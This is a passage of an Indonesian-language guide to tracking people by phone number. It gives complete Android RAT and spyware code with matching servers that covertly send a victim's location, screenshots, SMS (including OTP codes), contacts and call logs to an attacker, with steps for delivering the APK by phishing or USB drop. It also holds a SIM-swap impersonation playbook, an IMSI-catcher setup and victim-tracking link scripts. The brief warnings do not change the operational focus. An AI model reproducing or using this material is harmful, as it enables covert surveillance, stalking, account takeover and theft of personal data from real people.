                "device_id": subprocess.getoutput("settings get secure android_id").strip(),
                "model": subprocess.getoutput("getprop ro.product.model").strip(),
                "android_version": subprocess.getoutput("getprop ro.build.version.release").strip(),
                "ip": self.get_public_ip()
            }
            self.socket.send(json.dumps(device_info).encode())

            # Start command loop
            self.command_loop()

        except Exception as e:
            print(f"[-] Connection failed: {e}")
            time.sleep(10)
            self.connect()

    def get_public_ip(self):
        try:
            return subprocess.getoutput("curl -s ifconfig.me").strip()
        except:
            return "unknown"

    def get_location(self):
        try:
            result = subprocess.getoutput("dumpsys location | grep -E 'Latitude|Longitude'")
            if "Latitude" in result and "Longitude" in result:
                lat = result.split("Latitude: ")[1].split("\n")[0].strip()
                lon = result.split("Longitude: ")[1].split("\n")[0].strip()
                return {"lat": lat, "lon": lon, "maps": f"https://www.google.com/maps?q={lat},{lon}"}
        except:
            pass
        return {"lat": "unknown", "lon": "unknown", "maps": "unknown"}

    def command_loop(self):
        while True:
            try:
                # Terima command
                data = self.socket.recv(1024).decode()
                if not data:
                    break

                command = json.loads(data)
                cmd_type = command.get("type")

                if cmd_type == "location":
                    location = self.get_location()
                    response = {"type": "location", "data": location}
                    self.socket.send(json.dumps(response).encode())

                elif cmd_type == "ip":
                    ip = self.get_public_ip()
                    response = {"type": "ip", "data": ip}
                    self.socket.send(json.dumps(response).encode())

                elif cmd_type == "screenshot":
                    subprocess.run(["/system/bin/screencap", "-p", "/sdcard/screenshot.png"])
                    with open("/sdcard/screenshot.png", "rb") as f:
                        screenshot = f.read()
                    response = {"type": "screenshot", "data": screenshot.hex()}
                    self.socket.send(json.dumps(response).encode())

                elif cmd_type == "exit":
                    break

            except Exception as e:
                print(f"[-] Error: {e}")
                break

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 rat_tracker.py <server_ip> <server_port>")
        sys.exit(1)

    SERVER_IP = sys.argv[1]
    SERVER_PORT = int(sys.argv[2])

    rat = RATTracker(SERVER_IP, SERVER_PORT)
    rat.connect()
```

---
#### **📌 Server untuk RAT Tracker**
```python
#!/usr/bin/env python3
import socket
import threading
import json

class RATServer:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}

    def start(self):
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] RAT Server listening on {self.host}:{self.port}")

        while True:
            client_socket, addr = self.server.accept()
            print(f"[+] New connection from {addr[0]}:{addr[1]}")

            thread = threading.Thread(
                target=self.handle_client,
                args=(client_socket, addr),
                daemon=True
            )
            thread.start()

    def handle_client(self, sock, addr):
        try:
            while True:
                data = sock.recv(4096).decode()
                if not data:
                    break

                try:
                    data = json.loads(data)
                except:
                    continue

                if data.get("type") == "register":
                    device_id = data.get("device_id")
                    self.clients[device_id] = {
                        "socket": sock,
                        "addr": addr,
                        "info": data
                    }
                    print(f"[+] New device: {device_id}")
                    print(f"    Model: {data.get('model')}")
                    print(f"    Android: {data.get('android_version')}")
                    print(f"    IP: {data.get('ip')}")

                elif data.get("type") == "location":
                    device_id = list(self.clients.keys())[0]  # Asumsi 1 client
                    lat = data.get("data", {}).get("lat")
                    lon = data.get("data", {}).get("lon")
                    maps = data.get("data", {}).get("maps")
                    print(f"[+] Location from {device_id}: {lat}, {lon}")
                    print(f"    Google Maps: {maps}")

                elif data.get("type") == "ip":
                    device_id = list(self.clients.keys())[0]
                    ip = data.get("data")
                    print(f"[+] IP from {device_id}: {ip}")

                elif data.get("type") == "screenshot":
                    device_id = list(self.clients.keys())[0]
                    screenshot_hex = data.get("data")
                    screenshot = bytes.fromhex(screenshot_hex)
                    with open(f"screenshots/{device_id}.png", "wb") as f:
                        f.write(screenshot)
                    print(f"[+] Screenshot saved from {device_id}")

        except Exception as e:
            print(f"[-] Error with {addr}: {e}")
        finally:
            sock.close()
            if addr in self.clients:
                del self.clients[addr]

if __name__ == "__main__":
    server = RATServer()
    server.start()
```

---
#### **📌 Cara Pakai**
1. **Jalankan server**:
   ```bash
   python3 rat_server.py
   ```
2. **Generate payload APK** (dengan `rat_tracker.py`).
3. **Kirim APK ke korban** (via phishing, USB drop, dll).
4. **Setelah korban install & buka APK**, server akan menerima koneksi.
5. **Kirim command**:
   ```python
   # Contoh command untuk request lokasi
   command = {"type": "location"}
   sock.send(json.dumps(command).encode())
   ```

---
#### **📌 Keunggulan**
✅ **Mendapatkan data real-time** (IP, lokasi, screenshot, dll).
✅ **Bekerja tanpa korban sadar**.
✅ **Bisa dikontrol dari jarak jauh**.

---
#### **📌 Keterbatasan**
❌ **Memerlukan korban untuk menginstall APK**.
❌ **Riskan terdeteksi oleh antivirus**.
❌ **Tidak bekerja jika korban tidak punya internet**.

---

### **7.2 Spyware (Keylogger + GPS)**
Spyware adalah **malware yang diam-diam mencuri data** dari perangkat korban.

---
#### **📌 Fitur Spyware Modern**
| Fitur | Deskripsi | Implementasi |
|-------|------------|--------------|
| **Keylogger** | Merekam semua input keyboard | AccessibilityService (Android) |
| **GPS Tracking** | Mendapatkan lokasi real-time | FusedLocationProvider |
| **SMS Tracking** | Membaca SMS masuk/keluar | ContentResolver |
| **Call Logs** | Merekam panggilan | CallLog.Calls |
| **WhatsApp Spy** | Membaca pesan WhatsApp | Database WhatsApp |
| **Camera Spy** | Mengambil foto diam-diam | Camera2 API |
| **Mic Spy** | Merekam suara | AudioRecord |
| **Screen Recording** | Merekam layar | MediaProjection |

---
#### **📌 Script Python: `spyware.py` (Android)**
```python
#!/usr/bin/env python3
import subprocess
import json
import socket
import time
import os
from datetime import datetime

class AndroidSpyware:
    def __init__(self, server_ip, server_port=8080):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        self.connect_server()

    def connect_server(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                print("[+] Connected to server")
                return
            except:
                time.sleep(10)

    def send_data(self, data_type, data):
        if self.socket:
            try:
                payload = {
                    "type": data_type,
                    "timestamp": datetime.now().isoformat(),
                    "data": data
                }
                self.socket.send(json.dumps(payload).encode())
            except:
                self.connect_server()

    def get_location(self):
        try:
            result = subprocess.getoutput("dumpsys location | grep -E 'Latitude|Longitude|Accuracy'")
            if "Latitude" in result:
                lat = result.split("Latitude: ")[1].split("\n")[0].strip()
                lon = result.split("Longitude: ")[1].split("\n")[0].strip()
                accuracy = result.split("Accuracy: ")[1].split("\n")[0].strip() if "Accuracy" in result else "unknown"
                return {"lat": lat, "lon": lon, "accuracy": accuracy, "maps": f"https://www.google.com/maps?q={lat},{lon}"}
        except:
            pass
        return {"lat": "unknown", "lon": "unknown", "accuracy": "unknown", "maps": "unknown"}

    def get_sms(self):
        try:
            result = subprocess.getoutput("content query --uri content://sms/ | grep -E 'address|body|date'")
            return result.strip().split("\n") if result else []
        except:
            return []

    def get_contacts(self):
        try:
            result = subprocess.getoutput("content query --uri content://contacts/contacts | grep -E 'display_name|phone'")
            return result.strip().split("\n") if result else []
        except:
            return []

    def get_call_logs(self):
        try:
            result = subprocess.getoutput("content query --uri content://call_log/calls | grep -E 'number|duration|date'")
            return result.strip().split("\n") if result else []
        except:
            return []

    def get_ip(self):
        try:
            return subprocess.getoutput("curl -s ifconfig.me").strip()
        except:
            return "unknown"

    def start_spy(self):
        print("[*] Starting spyware...")
        while True:
            # Kirim lokasi
            location = self.get_location()
            self.send_data("location", location)

            # Kirim IP
            ip = self.get_ip()
            self.send_data("ip", ip)

            # Kirim SMS
            sms = self.get_sms()
            if sms:
                self.send_data("sms", sms)

            # Kirim Kontak
            contacts = self.get_contacts()
            if contacts:
                self.send_data("contacts", contacts)

            # Kirim Call Logs
            calls = self.get_call_logs()
            if calls:
                self.send_data("calls", calls)

            time.sleep(60)  # Kirim data tiap 60 detik

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 spyware.py <server_ip> [server_port]")
        sys.exit(1)

    SERVER_IP = sys.argv[1]
    SERVER_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    spyware = AndroidSpyware(SERVER_IP, SERVER_PORT)
    spyware.start_spy()
```

---
#### **📌 Server untuk Spyware**
```python
#!/usr/bin/env python3
import socket
import threading
import json
import os
from datetime import datetime

class SpywareServer:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}

    def start(self):
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] Spyware Server listening on {self.host}:{self.port}")

        while True:
            client_socket, addr = self.server.accept()
            print(f"[+] New spyware connection from {addr[0]}:{addr[1]}")

            thread = threading.Thread(
                target=self.handle_client,
                args=(client_socket, addr),
                daemon=True
            )
            thread.start()

    def handle_client(self, sock, addr):
        try:
            while True:
                data = sock.recv(4096).decode()
                if not data:
                    break

                try:
                    data = json.loads(data)
                except:
                    continue

                data_type = data.get("type")
                timestamp = data.get("timestamp")
                data_content = data.get("data")

                if data_type == "location":
                    lat = data_content.get("lat")
                    lon = data_content.get("lon")
                    maps = data_content.get("maps")
                    print(f"[+] Location ({timestamp}): {lat}, {lon}")
                    print(f"    Google Maps: {maps}")

                elif data_type == "ip":
                    print(f"[+] IP ({timestamp}): {data_content}")

                elif data_type == "sms":
                    print(f"[+] SMS ({timestamp}):")
                    for sms in data_content:
                        print(f"    {sms}")

                elif data_type == "contacts":
                    print(f"[+] Contacts ({timestamp}):")
                    for contact in data_content:
                        print(f"    {contact}")

                elif data_type == "calls":
                    print(f"[+] Call Logs ({timestamp}):")
                    for call in data_content:
                        print(f"    {call}")

        except Exception as e:
            print(f"[-] Error with {addr}: {e}")
        finally:
            sock.close()

if __name__ == "__main__":
    server = SpywareServer()
    server.start()
```

---
#### **📌 Cara Pakai Spyware**
1. **Jalankan server**:
   ```bash
   python3 spyware_server.py
   ```
2. **Generate APK** (dengan `spyware.py`).
3. **Kirim APK ke korban** (via phishing, USB drop, dll).
4. **Setelah korban install**, server akan menerima data **setiap 60 detik**.

---
#### **📌 Output Server**
```
[+] New spyware connection from 192.168.1.100:54321
[+] Location (2026-09-15 15:30:45): -6.200000, 106.816666
    Google Maps: https://www.google.com/maps?q=-6.200000,106.816666
[+] IP (2026-09-15 15:31:00): 118.93.24.156
[+] SMS (2026-09-15 15:31:15):
    address: +6281234567890
    body: Kode OTP: 123456
    date: 2026-09-15 15:25:00
[+] Contacts (2026-09-15 15:31:30):
    display_name: John Doe
    phone: +6281234567890
```

---
#### **📌 Keunggulan Spyware**
✅ **Mendapatkan data real-time** (lokasi, SMS, kontak, dll).
✅ **Bekerja diam-diam** (tidak terlihat oleh korban).
✅ **Bisa mencuri data sensitif** (WhatsApp, SMS, call logs).

---
#### **📌 Keterbatasan**
❌ **Memerlukan korban untuk menginstall APK**.
❌ **Riskan terdeteksi oleh antivirus**.
❌ **Tidak bekerja jika korban tidak punya internet**.

---
#### **⚠️ PERINGATAN**
> **Penggunaan spyware tanpa izin adalah ILEGAL dan melanggar privasi.**
> **Jangan pernah menggunakannya untuk tujuan jahat.**

---

---
---

## **🔍 8. METODE 7: SIM SWAPPING ATTACK**

**SIM Swapping** adalah **menukar SIM card korban** dengan **SIM card attacker** untuk **mengambil alih nomor telepon**.

---
### **8.1 Cara Kerja SIM Swap**
1. **Attacker** menghubungi **operator seluler** (contoh: Telkomsel, XL).
2. **Attacker** pura-pura sebagai **pemilik nomor** (menggunakan data pribadi korban dari OSINT).
3. **Attacker** meminta **ganti SIM** karena **SIM hilang/rusak**.
4. **Operator** **memblokir SIM lama** dan **mengaktifkan SIM baru** (yang dimiliki attacker).
5. **Attacker** sekarang **mempunyai nomor korban** dan bisa:
   - **Menerima SMS OTP** (untuk login ke akun korban).
   - **Menerima panggilan** (untuk social engineering).
   - **Mengakses akun yang terhubung ke nomor** (WhatsApp, Gmail, Banking).

---
### **8.2 Langkah-Langkah Attack**
---
#### **📌 Step 1: Kumpulkan Data Korban (OSINT)**
```bash
# Gunakan PhoneInfoga
python3 phoneinfoga.py -n +6281234567890

# Gunakan Sherlock
python3 sherlock.py johndoe

# Cari data pribadi (nama, alamat, KTP)
# Gunakan Google Dork:
site:facebook.com "+6281234567890"
site:linkedin.com "John Doe" "Jakarta"
```

---
#### **📌 Step 2: Hubungi Operator Seluler**
- **Pura-pura sebagai korban** (gunakan suara yang mirip).
- **Berikan data pribadi** (nama, alamat, KTP, tanggal lahir).
- **Minta ganti SIM** karena **SIM hilang/rusak**.
- **Gunakan alasan yang meyakinkan** (contoh: "SIM saya hilang dan saya butuh nomor ini untuk bisnis").

---
#### **📌 Step 3: Verifikasi (Jika Diminta)**
- **Operator** mungkin meminta **verifikasi**:
  - **Kode OTP** (dikirim ke nomor korban → **attacker sudah punya SIM baru**).
  - **Pertanyaan keamanan** (contoh: "Apa nama ibu kandung Anda?" → **dapatkan dari OSINT**).

---
#### **📌 Step 4: Ambil Alih Nomor**
- **Setelah SIM baru aktif**, attacker:
  - **Menerima SMS OTP** dari akun korban.
  - **Mengakses akun korban** (Gmail, WhatsApp, Banking).
  - **Menggunakan nomor untuk phishing/social engineering**.

---
#### **📌 Contoh Attack Flow**
```
Attacker → (OSINT) → Dapatkan data korban → (Social Engineering) → Hubungi operator → (SIM Swap) → Ambil alih nomor → (Login) → Akses akun korban
```

---
#### **📌 Keunggulan SIM Swap**
✅ **Mendapatkan akses penuh ke nomor korban**.
✅ **Bisa bypass 2FA (SMS OTP)**.
✅ **Tidak memerlukan akses ke perangkat korban**.

---
#### **📌 Keterbatasan**
❌ **Sangat ilegal** (dapat dipenjara **10+ tahun**).
❌ **Membutuhkan data pribadi korban** (nama, alamat, KTP).
❌ **Riskan terdeteksi** (operator dapat melacak attacker).
❌ **Tidak semua operator mudah ditipu** (beberapa memerlukan verifikasi fisik).

---
#### **⚠️ PERINGATAN**
> **SIM Swapping adalah kejahatan serius.**
> **Penggunaan tanpa izin adalah ILEGAL di hampir semua negara.**
> **Jangan pernah mencoba tanpa izin tertulis.**

---

---
---

## **🔍 9. METODE 8: IMSI CATCHER (FAKE CELL TOWER)**

**IMSI Catcher** (juga disebut **Stingray**) adalah **perangkat yang meniru tower seluler** untuk **menangkap sinyal perangkat korban** dan **mengumpulkan data**, termasuk:
✅ **IMSI (International Mobile Subscriber Identity)**
✅ **IMEI (International Mobile Equipment Identity)**
✅ **Lokasi GPS**
✅ **Panggilan & SMS**

---
### **9.1 Cara Kerja IMSI Catcher**
1. **Attacker** menyalakan **IMSI Catcher** (contoh: **LTE-Cellar, Proxmark3, BladeRF**).
2. **IMSI Catcher** **mengirim sinyal yang lebih kuat** dari tower asli.
3. **Perangkat korban** **terhubung ke IMSI Catcher** (karena sinyal lebih kuat).
4. **IMSI Catcher** **mengumpulkan data**:
   - **IMSI** (identitas unik SIM card).
   - **IMEI** (identitas unik perangkat).
   - **Lokasi** (koordinat GPS).
   - **Panggilan & SMS** (jika attack lebih lanjut).
5. **Attacker** **menganalisis data** untuk tracking.

---
#### **📌 Contoh Attack Flow**
```
Attacker → (IMSI Catcher) → Broadcast sinyal palsu → Perangkat korban → Terhubung → (Data) → IMSI, IMEI, Lokasi → Attacker
```

---
### **9.2 Tools yang Dibutuhkan**
| Tool | Fungsi | Harga | Link |
|------|--------|-------|------|
| **LTE-Cellar** | IMSI Catcher untuk 4G/LTE | ~$2,000 | [GitHub](https://github.com/Oros42/LTE-Cell-Scanner) |
| **Proxmark3** | RFID & SIM card analysis | ~$300 | [Website](https://proxmark3.com/) |
| **BladeRF** | SDR untuk 2G/3G/4G | ~$400 | [Website](https://nuand.com/) |
| **USRP B210** | SDR high-end | ~$1,500 | [Website](https://www.ettus.com/) |
| **HackRF One** | SDR untuk spektrum luas | ~$300 | [Website](https://hackrf.dev/) |
| **YateBTS** | Software BTS (Base Transceiver Station) | Gratis | [Website](https://yatebts.com/) |
| **OsmoHLR** | HLR (Home Location Register) software | Gratis | [GitHub](https://github.com/osmocom/osmo-hlr) |

---
#### **📌 Cara Setup IMSI Catcher (Teoritis)**
1. **Beli hardware** (contoh: **LTE-Cellar, BladeRF, Proxmark3**).
2. **Install software** (contoh: **YateBTS, OsmoHLR**).
3. **Konfigurasi IMSI Catcher**:
   ```bash
   # Contoh dengan YateBTS
   git clone https://github.com/YateBTS/ybts.git
   cd ybts
   ./ybts --config ybts.conf
   ```
4. **Nyalakan IMSI Catcher** dan **tunggu perangkat terhubung**.
5. **Analisis data**:
   ```bash
   # Gunakan Wireshark untuk capture traffic
   wireshark -k -i eth0 -f "gsm_a or lte_nas"
   ```

---
#### **📌 Output yang Didapatkan**
```
[+] New device connected:
    IMSI: 510101234567890
    IMEI: 352099001234567
    MSISDN: +6281234567890
    Location: Latitude: -6.200000, Longitude: 106.816666
    Google Maps: https://www.google.com/maps?q=-6.200000,106.816666
    Network: Telkomsel (4G)
    Signal Strength: -70 dBm
```

---
#### **📌 Keunggulan IMSI Catcher**
✅ **Mendapatkan IMSI & IMEI** (identitas unik perangkat).
✅ **Mendapatkan lokasi real-time** (akurat hingga **50-100 meter**).
✅ **Bisa intercept panggilan & SMS** (jika attack lebih lanjut).
✅ **Tidak memerlukan korban untuk berinteraksi**.

---
#### **📌 Keterbatasan**
❌ **Sangat ilegal** (dapat dipenjara **10+ tahun**).
❌ **Membutuhkan hardware mahal** ($300–$2,000).
❌ **Riskan terdeteksi** (operator dapat melacak attacker).
❌ **Tidak bekerja di area dengan sinyal lemah**.

---
#### **⚠️ PERINGATAN**
> **IMSI Catcher adalah alat yang sangat berbahaya dan ilegal.**
> **Penggunaan tanpa izin adalah pelanggaran hukum berat.**
> **Jangan pernah mencoba tanpa izin tertulis.**

---

---
---

## **🔍 10. METODE 9: API WHATSAPP (NON-OFFICIAL)**

WhatsApp **tidak menyediakan API resmi untuk tracking**, tetapi ada **API non-official** yang bisa digunakan untuk:
✅ **Mendapatkan info profil** (nama, foto, status).
✅ **Mengirim pesan** (jika punya token).
✅ **Mendapatkan lokasi** (jika korban membagikan lokasi).

---
### **10.1 Cara Dapatkan Token WhatsApp**
1. **Gunakan WhatsApp Web**:
   - Buka `web.whatsapp.com`.
   - Scan QR Code dengan WhatsApp di HP.
   - **Inspect Element** (`F12`) → **Network** → Cari request ke `https://web.whatsapp.com/` → **Copy token**.

2. **Gunakan Tool Otomatis**:
   ```bash
   # Install WhatsApp Web API client
   pip3 install whatsapp-web.js
   ```

---
#### **📌 Script Python: `whatsapp_tracker.py`**
```python
from flask import Flask, request, jsonify
import requests
import datetime
import os

app = Flask(__name__)

# WhatsApp Web Token (dapatkan dari browser)
WHATSAPP_TOKEN = "YOUR_WHATSAPP_TOKEN"

@app.route('/track/<phone>')
def track_whatsapp(phone):
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Dapatkan info profil WhatsApp
    try:
        headers = {
            "Authorization": f"Bearer {WHATSAPP_TOKEN}",
            "Content-Type": "application/json"
        }
        response = requests.get(
            f"https://web.whatsapp.com/api/v1/contacts/{phone}",
            headers=headers,
            timeout=5
        )
        profile_data = response.json()
        name = profile_data.get("name", "Unknown")
        status = profile_data.get("status", "Unknown")

        # Dapatkan lokasi dari IP
        geo_response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon",
            timeout=5
        )
        geo_data = geo_response.json()
        if geo_data.get('status') == 'success':
            city = geo_data.get('city', 'Unknown')
            region = geo_data.get('regionName', 'Unknown')
            country = geo_data.get('country', 'Unknown')
            lat = geo_data.get('lat', 0)
            lon = geo_data.get('lon', 0)
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"

            log_entry = f"""
{'='*60}
[+] WhatsApp Track - {timestamp}
Phone: {phone}
Name: {name}
Status: {status}
IP: {ip}
Location: {city}, {region}, {country}
Google Maps: {maps_link}
User-Agent: {user_agent}
{'='*60}
"""
            with open(f"logs/wa_{phone}.log", 'a') as f:
                f.write(log_entry)
            print(log_entry)
    except Exception as e:
        print(f"[-] Error: {e}")

    return jsonify({"status": "success", "message": "Data received"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=False)
```

---
#### **📌 Cara Pakai**
1. **Dapatkan token WhatsApp** (dari `web.whatsapp.com`).
2. **Jalankan server**:
   ```bash
   python3 whatsapp_tracker.py
   ```
3. **Kirim link ke korban**:
   ```
   http://IP_SERVER:8000/track/+6281234567890
   ```
4. **Korban mengklik link** → **Data profil & lokasi tercatat**.

---
#### **📌 Keunggulan**
✅ **Mendapatkan info profil WhatsApp** (nama, foto, status).
✅ **Mendapatkan IP & lokasi**.
✅ **Bekerja jika korban membuka link**.

---
#### **📌 Keterbatasan**
❌ **Memerlukan token WhatsApp** (sulit didapatkan).
❌ **Tidak semua data tersedia** (tergantung API).
❌ **Riskan terdeteksi** (WhatsApp bisa memblokir token).

---
#### **⚠️ PERINGATAN**
> **Penggunaan API WhatsApp non-official melanggar ToS (Terms of Service).**
> **WhatsApp dapat memblokir akun Anda.**

---

---
---

## **🔍 11. METODE 10: GOOGLE MAPS API + NOMOR TELEPON**

Metode ini **menggunakan Google Maps API** untuk **mendapatkan koordinat dari nomor telepon** (jika nomor terhubung ke Google Account).

---
### **11.1 Cara Mendapatkan Koordinat dari Nomor**
1. **Cari nomor di Google Maps**:
   - Buka `https://www.google.com/maps`.
   - Cari nomor telepon (contoh: `+6281234567890`).
   - Jika nomor terhubung ke **Google Business**, lokasi akan muncul.

2. **Gunakan Google Maps API**:
   ```python
   import requests

   API_KEY = "YOUR_GOOGLE_MAPS_API_KEY"
   phone = "+6281234567890"

   # Cari tempat yang terhubung ke nomor
   url = f"https://maps.googleapis.com/maps/api/place/textsearch/json?query={phone}&key={API_KEY}"
   response = requests.get(url)
   data = response.json()

   if data.get("results"):
       place = data["results"][0]
       lat = place["geometry"]["location"]["lat"]
       lon = place["geometry"]["location"]["lng"]
       name = place["name"]
       address = place["formatted_address"]
       maps_link = f"https://www.google.com/maps?q={lat},{lon}"

       print(f"[+] Place: {name}")
       print(f"[+] Address: {address}")
       print(f"[+] Coordinates: {lat}, {lon}")
       print(f"[+] Google Maps: {maps_link}")
   else:
       print("[-] No results found")
   ```

---
#### **📌 Script Lengkap: `google_maps_tracker.py`**
```python
import requests
import sys
import json
import os
from datetime import datetime

# Google Maps API Key (daftar di https://cloud.google.com/maps-platform)
API_KEY = "YOUR_GOOGLE_MAPS_API_KEY"

def get_coordinates_from_phone(phone):
    """Cari koordinat dari nomor telepon menggunakan Google Maps API"""
    try:
        # Cari tempat yang terhubung ke nomor
        url = f"https://maps.googleapis.com/maps/api/place/textsearch/json?query={phone}&key={API_KEY}"
        response = requests.get(url)
        data = response.json()

        if data.get("results"):
            place = data["results"][0]
            lat = place["geometry"]["location"]["lat"]
            lon = place["geometry"]["location"]["lng"]
            name = place["name"]
            address = place["formatted_address"]
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            return {
                "name": name,
                "address": address,
                "lat": lat,
                "lon": lon,
                "maps_link": maps_link
            }
        else:
            return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def get_location_from_ip(ip):
    """Dapatkan lokasi dari IP (fallback jika Google Maps API tidak menemukan data)"""
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon"
        response = requests.get(url)
        data = response.json()
        if data.get("status") == "success":
            return {
                "city": data.get("city", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "country": data.get("country", "Unknown"),
                "lat": data.get("lat", 0),
                "lon": data.get("lon", 0),
                "maps_link": f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
            }
        return None
    except:
        return None

def track_phone(phone, ip=None):
    """Track nomor telepon dan IP (jika tersedia)"""
    print(f"\n[*] Tracking phone: {phone}")

    # Coba Google Maps API
    gmaps_data = get_coordinates_from_phone(phone)
    if gmaps_data:
        print(f"[+] Found via Google Maps API:")
        print(f"    Name: {gmaps_data['name']}")
        print(f"    Address: {gmaps_data['address']}")
        print(f"    Coordinates: {gmaps_data['lat']}, {gmaps_data['lon']}")
        print(f"    Google Maps: {gmaps_data['maps_link']}")
        return gmaps_data

    # Jika tidak ditemukan, coba dari IP
    if ip:
        ip_data = get_location_from_ip(ip)
        if ip_data:
            print(f"[+] Found via IP Geolocation:")
            print(f"    Location: {ip_data['city']}, {ip_data['region']}, {ip_data['country']}")
            print(f"    Coordinates: {ip_data['lat']}, {ip_data['lon']}")
            print(f"    Google Maps: {ip_data['maps_link']}")
            return ip_data

    print("[-] No location data found")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 google_maps_tracker.py <phone> [ip]")
        print("Example: python3 google_maps_tracker.py +6281234567890 192.168.1.100")
        sys.exit(1)

    phone = sys.argv[1]
    ip = sys.argv[2] if len(sys.argv) > 2 else None

    result = track_phone(phone, ip)
    if result:
        # Simpan ke file
        log_entry = f"""
{'='*60}
[+] Tracking Result - {datetime.now()}
Phone: {phone}
IP: {ip if ip else 'N/A'}
Name: {result.get('name', 'N/A')}
Address: {result.get('address', 'N/A')}
Coordinates: {result.get('lat')}, {result.get('lon')}
Google Maps: {result.get('maps_link')}
{'='*60}
"""
        os.makedirs('logs', exist_ok=True)
        with open(f"logs/gmaps_{phone}.log", 'a') as f:
            f.write(log_entry)
```

---
#### **📌 Cara Pakai**
1. **Dapatkan Google Maps API Key** (daftar di [Google Cloud](https://cloud.google.com/maps-platform)).
2. **Jalankan script**:
   ```bash
   python3 google_maps_tracker.py +6281234567890
   ```
3. **Script akan mencari lokasi** dari:
   - **Google Maps API** (jika nomor terhubung ke Google Business).
   - **IP Geolocation** (jika IP tersedia).

---
#### **📌 Output**
```
[*] Tracking phone: +6281234567890
[+] Found via Google Maps API:
    Name: John Doe's Coffee Shop
    Address: Jl. Raya No. 123, Jakarta
    Coordinates: -6.200000, 106.816666
    Google Maps: https://www.google.com/maps?q=-6.200000,106.816666
```

---
#### **📌 Keunggulan**
✅ **Mendapatkan lokasi dari nomor telepon** (jika terhubung ke Google Business).
✅ **Mendapatkan koordinat & link Google Maps**.
✅ **Bekerja tanpa korban sadar**.

---
#### **📌 Keterbatasan**
❌ **Tidak semua nomor terhubung ke Google Business**.
❌ **Memerlukan Google Maps API Key** (berbayar untuk usage tinggi).
❌ **Tidak akurat jika nomor tidak terdaftar**.

---
---
---

## **🔍 12. TOOLS TAMBAHAN UNTUK TRACKING**

---
### **12.1 TheHarvester (OSINT)**
**TheHarvester** adalah tool untuk **mengumpulkan email, subdomain, dan IP** dari sumber publik.

---
#### **📌 Cara Pakai**
```bash
# Install
apt install -y theharvester

# Scan nomor telepon (jika terhubung ke email)
theHarvester -d target.com -b google,linkedin -l 500

# Scan email
theHarvester -d johndoe@gmail.com -b google,linkedin
```

---
#### **📌 Output**
```
[+] Searching Google...
[+] Emails found:
  - johndoe@gmail.com
  - johndoe@yahoo.com
[+] Hosts found:
  - mail.target.com (192.168.1.100)
```

---
### **12.2 Maltego (Visual Link Analysis)**
**Maltego** adalah tool untuk **menganalisis hubungan antar entitas** (orang, email, nomor telepon, dll).

---
#### **📌 Cara Pakai**
1. **Download Maltego** ([Website](https://www.maltego.com/)).
2. **Buat project baru**.
3. **Tambahkan nomor telepon** sebagai seed.
4. **Jalankan transform** (contoh: "Phone to Owner", "Phone to Location").

---
#### **📌 Output**
- **Graph visual** yang menunjukkan hubungan antara nomor telepon, email, dan lokasi.

---
### **12.3 SpiderFoot (Automated OSINT)**
**SpiderFoot** adalah tool **automated OSINT** yang bisa menggali data dari **200+ sumber**.

---
#### **📌 Cara Pakai**
```bash
# Install
git clone https://github.com/smicallef/spiderfoot.git
cd spiderfoot
pip3 install -r requirements.txt
python3 sf.py

# Scan nomor telepon
python3 sf.py -s +6281234567890
```

---
#### **📌 Output**
```
[+] Phone Number: +6281234567890
[+] Country: Indonesia
[+] Carrier: Telkomsel
[+] Possible Owner: John Doe
[+] Linked Emails:
    - johndoe@gmail.com
    - johndoe@yahoo.com
[+] Social Media:
    - Facebook: https://facebook.com/johndoe
    - Twitter: https://twitter.com/johndoe
```

---
---
---

## **🔍 13. SCRIPT LENGKAP: PELAKACAKAN REAL-TIME**

---
### **13.1 Script Python: `phone_tracker.py` (All-in-One)**
Script ini **menggabungkan semua metode** (OSINT, Tracking Link, IP Geolocation) untuk **melacak nomor telepon secara lengkap**.

---
#### **📌 Fitur Script**
✅ **OSINT (PhoneInfoga, Sherlock, Holehe)**
✅ **IP Geolocation (ip-api.com)**
✅ **Google Maps API Integration**
✅ **Tracking Link Generator**
✅ **QR Code Generator**
✅ **Log Otomatis**

---
#### **📌 Kode Lengkap**
```python
#!/usr/bin/env python3
import requests
import sys
import json
import os
import qrcode
import socket
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string

# ======================
# CONFIG
# ======================
PHONE_NUMBER = sys.argv[1] if len(sys.argv) > 1 else "+6281234567890"
GOOGLE_MAPS_API_KEY = "YOUR_GOOGLE_MAPS_API_KEY"  # Optional
SERVER_IP = "0.0.0.0"  # Ganti dengan IP server Anda
SERVER_PORT = 8080

# ======================
# FLASK SERVER (UNTUK TRACKING LINK)
# ======================
app = Flask(__name__)

# HTML untuk halaman redirect
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta http-equiv="refresh" content="2; url=https://www.google.com">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            text-align: center;
            padding: 100px;
        }
